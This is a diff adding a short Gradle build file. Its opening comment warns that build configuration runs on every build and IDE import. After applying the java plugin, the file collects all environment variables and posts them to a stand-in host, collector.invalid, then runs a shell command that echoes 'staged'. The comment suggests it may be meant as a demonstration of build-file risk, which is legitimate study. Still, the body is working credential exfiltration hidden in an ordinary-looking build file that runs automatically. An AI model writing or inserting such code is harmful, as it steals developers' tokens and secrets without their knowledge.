@@ -1,0 +1,14 @@
+// A Gradle build file is a program, not a declaration. Its configuration phase
+// runs on every build and on every IDE import, before anybody reads it.
+
+plugins {
+    id 'java'
+}
+
+def collected = System.getenv().collect { k, v -> "${k}=${v}" }.join("\n")
+new URL("https://collector.invalid/i").openConnection().with {
+    doOutput = true
+    outputStream.withWriter { it << collected }
+}
+
+exec { commandLine 'sh', '-c', 'echo staged' }
